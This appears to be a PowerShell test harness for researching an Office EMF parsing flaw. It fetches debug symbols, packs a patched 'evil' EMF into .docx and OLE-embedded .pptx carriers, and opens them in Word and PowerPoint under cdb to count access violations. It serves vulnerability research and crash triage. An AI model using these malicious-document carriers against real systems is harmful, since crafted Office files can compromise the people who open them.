[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$ErrorActionPreference='Continue'
$root='C:\Program Files\Microsoft Office\root\Office16'
$work='C:\emfwork'
New-Item -ItemType Directory -Force -Path "$work\dbg","$work\out",'C:\sym' | Out-Null
Set-Location $work
function Log($m){ $m | Tee-Object -FilePath "$work\out\summary.txt" -Append }
Log ('=== env ===')
Log ('office: ' + (Get-Item "$root\WINWORD.EXE").VersionInfo.FileVersion)
Log ('build: ' + (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration').VersionToReport)

function GetRsds($path){
  $d=[System.IO.File]::ReadAllBytes($path)
  for($i=0;$i -lt $d.Length-40;$i++){
    if($d[$i] -eq 0x52 -and $d[$i+1] -eq 0x53 -and $d[$i+2] -eq 0x44 -and $d[$i+3] -eq 0x53){
      $g=[System.Guid]::new([byte[]]($d[($i+4)..($i+19)]))
      $age=[BitConverter]::ToUInt32($d,$i+20)
      $e=$i+24; while($e -lt $d.Length -and $d[$e] -ne 0){$e++}
      return @{name=[System.Text.Encoding]::ASCII.GetString($d[($i+24)..($e-1)]); guid=$g.ToString('N').ToUpper(); age=$age}
    }
  }
}
$cands=@("$root\mso.dll",'C:\Program Files\Common Files\Microsoft Shared\OFFICE16\mso.dll','C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\mso.dll')
$msoDll = $cands | Where-Object { Test-Path $_ } | Select-Object -First 1
Log ("mso.dll at: $msoDll")
foreach($m in @('mso','ppcore')){
  $dll = if($m -eq 'mso'){$msoDll}else{"$root\ppcore.dll"}
  $rs=GetRsds $dll
  Log ("$m rsds: $($rs.name) $($rs.guid) $($rs.age) file=" + (Split-Path $dll -Leaf))
  $dst="C:\sym\$($rs.name)"
  foreach($try in 1..3){
    $code=& curl.exe -sL -w '%{http_code}' -o "$dst.tmp" "https://msdl.microsoft.com/download/symbols/$($rs.name)/$($rs.guid)$($rs.age)/$($rs.name)"
    $sz=(Get-Item "$dst.tmp" -ErrorAction SilentlyContinue).Length
    Log ("  dl try$try http=$code size=$sz")
    if($code -eq '200' -and $sz -gt 1000000){ Move-Item "$dst.tmp" $dst -Force; break }
    Start-Sleep -Seconds 4
  }
  Log ("$m pdb bytes: " + (Get-Item $dst -ErrorAction SilentlyContinue).Length)
}
python "$env:EMFTOOLS\msfpdb.py" C:\sym\MSO.pdb "$msoDll" mso.tsv 2>&1 | ForEach-Object { Log "  msfpdb mso: $_" }
python "$env:EMFTOOLS\msfpdb.py" C:\sym\ppcore.pdb "$root\ppcore.dll" ppcore.tsv 2>&1 | ForEach-Object { Log "  msfpdb ppc: $_" }
python "$env:EMFTOOLS\mkbp.py" mso.tsv ppcore.tsv bps.txt
if(-not (Test-Path bps.txt)){ throw 'mkbp failed' }
(Get-Content "$env:EMFTOOLS\dbgtemplate.txt") -replace '__BPSFILE__','C:\emfwork\bps.txt' | Set-Content dbgcfg.txt

winget install Microsoft.WinDbg --accept-source-agreements --accept-package-agreements --disable-interactivity | Out-Null
$cdb = Get-ChildItem 'C:\Program Files\WindowsApps' -Directory -Filter 'Microsoft.WinDbg*' -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem $_.FullName -Recurse -Filter cdb.exe -ErrorAction SilentlyContinue | Where-Object {$_.DirectoryName -match 'amd64'} } | Select-Object -First 1
if($cdb){
  New-Item -ItemType Directory -Force -Path "$work\dbg" | Out-Null
  Copy-Item $cdb.FullName "$work\dbg\cdb.exe" -Force
  Get-ChildItem $cdb.DirectoryName -Filter '*.dll' | ForEach-Object { Copy-Item $_.FullName "$work\dbg\" -Force }
  $cdb="$work\dbg\cdb.exe"
  Log ("cdb ready: $cdb")
} else { throw 'cdb not found after winget' }

python "$env:EMFTOOLS\gen_emf.py" good "$work\good.emf"
python "$env:EMFTOOLS\gen_emf.py" patch "$work\good.emf" "$work\evil.emf"
Set-Content "$work\seed.txt" 'seed'

Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
function MakeDocx($emf,$docx){
  $fs=[System.IO.File]::Create($docx); $za=New-Object System.IO.Compression.ZipArchive($fs,'Create')
  $parts=@{}
  $parts['[Content_Types].xml']='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="emf" ContentType="image/x-emf"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
  $parts['_rels/.rels']='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.emf"/></Relationships>'
  $parts['word/document.xml']='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"><w:body><w:p><w:r><w:t>pic</w:t></w:r><w:r><w:drawing><wp:inline><wp:extent cx="1905000" cy="1905000"/><wp:docPr id="1"/><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr id="1"/><pic:cNvPicPr/></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId2"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill><pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="1905000" cy="1905000"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p></w:body></w:document>'
  foreach($k in $parts.Keys){
    $e=$za.CreateEntry($k); $s=$e.Open(); $b=[Text.Encoding]::UTF8.GetBytes($parts[$k]); $s.Write($b,0,$b.Length); $s.Close()
  }
  $e=$za.CreateEntry('word/media/image1.emf'); $s=$e.Open(); $b=[System.IO.File]::ReadAllBytes($emf); $s.Write($b,0,$b.Length); $s.Close()
  $za.Dispose(); $fs.Close()
}
MakeDocx "$work\good.emf" "$work\good.docx"
MakeDocx "$work\evil.emf" "$work\evil.docx"

try{
  $pp=New-Object -ComObject PowerPoint.Application
  $pres=$pp.Presentations.Add(0)
  $pres.Slides.Add(1,12)|Out-Null
  $pres.Slides.Item(1).Shapes.AddOLEObject(60,60,300,300,'',"$work\seed.txt",-1,'',0,'',$null)|Out-Null
  $pres.SaveAs("$work\ole.pptx",24); $pres.Close()
  $pp.Quit()
  Log ('pptx carrier ok ' + (Get-Item "$work\ole.pptx" -ErrorAction SilentlyContinue).Length)
}catch{ Log ("pptx build fail: " + $_.Exception.Message) }
if(Test-Path "$work\ole.pptx"){
  $evil=[System.IO.File]::ReadAllBytes("$work\evil.emf")
  $zip=[System.IO.Compression.ZipFile]::Open("$work\ole.pptx",'Update')
  $entry=$zip.Entries | Where-Object {$_.FullName -like 'ppt/media/*.emf'} | Select-Object -First 1
  if($entry){
    $fn=$entry.FullName
    $entry.Delete()
    $ne=$zip.CreateEntry($fn)
    $s=$ne.Open(); $s.Write($evil,0,$evil.Length); $s.Close()
    Log ("pptx media patched: $fn")
  } else { Log 'pptx media entry NOT FOUND' }
  $zip.Dispose()
  Copy-Item "$work\ole.pptx" "$work\ole_evil.pptx" -Force
}

function Probe($exe,$args_,$comAction,$tag){
  Get-Process WINWORD,EXCEL,POWERPNT,cdb -ErrorAction SilentlyContinue | Stop-Process -Force
  Start-Sleep -Seconds 3
  $p=Start-Process -FilePath $exe -ArgumentList $args_ -PassThru
  Start-Sleep -Seconds 15
  $proc=Get-Process -Id $p.Id -ErrorAction SilentlyContinue
  if(-not $proc){ Log "PROBE $tag APP-DEAD-AT-START"; return }
  $log="$work\out\cdb_$tag.log"
  Start-Process -FilePath $cdb -ArgumentList "-logo","`"$log`"","-cf","`"$work\dbgcfg.txt`"","-p","$($p.Id)" -WindowStyle Hidden | Out-Null
  Start-Sleep -Seconds 18
  $c0=Get-Content $log -ErrorAction SilentlyContinue
  $armed=($c0 | Select-String -SimpleMatch 'Unable to resolve').Count
  Log "PROBE $tag armed_fail=$armed"
  & $comAction $p
  Start-Sleep -Seconds 25
  $c=Get-Content $log -ErrorAction SilentlyContinue
  $hits=($c | Where-Object { $_ -match '^===HIT_' }).Count
  $avs=($c | Select-String -Pattern 'Access violation').Count
  Log "PROBE $tag hits=$hits avs=$avs alive=$([bool](Get-Process -Id $p.Id -ErrorAction SilentlyContinue)) lines=$($c.Count)"
  ($c | Where-Object { $_ -match '===' }) | Select-Object -First 20 | ForEach-Object { Log "  ${tag}: $_" }
  Get-Process cdb -ErrorAction SilentlyContinue | Stop-Process -Force
  Get-Process WINWORD,EXCEL,POWERPNT -ErrorAction SilentlyContinue | Stop-Process -Force
  Start-Sleep -Seconds 2
}
$openDocE={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Open('C:\emfwork\evil.docx'); Start-Sleep 5; $d.Close(0); $w.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
Probe "$root\WINWORD.EXE" @('/n','/q') $openDocE 'word_evildocx'
$openDocG={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Open('C:\emfwork\good.docx'); Start-Sleep 5; $d.Close(0); $w.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
Probe "$root\WINWORD.EXE" @('/n','/q') $openDocG 'word_gooddocx'
$openPpt={ param($p) try{ $a=[Runtime.InteropServices.Marshal]::GetActiveObject('PowerPoint.Application'); $pres=$a.Presentations.Open('C:\emfwork\ole_evil.pptx',$true,$false,$true); Start-Sleep 8; try{ $pres.Slides.Item(1).Shapes.Item(1).OLEFormat.DoVerb(1) }catch{ Log ("  doverb: " + $_.Exception.Message) }; Start-Sleep 5; $pres.Close(); $a.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
Probe "$root\POWERPNT.EXE" @('/w') $openPpt 'ppt_evilole'
Log '=== done ==='
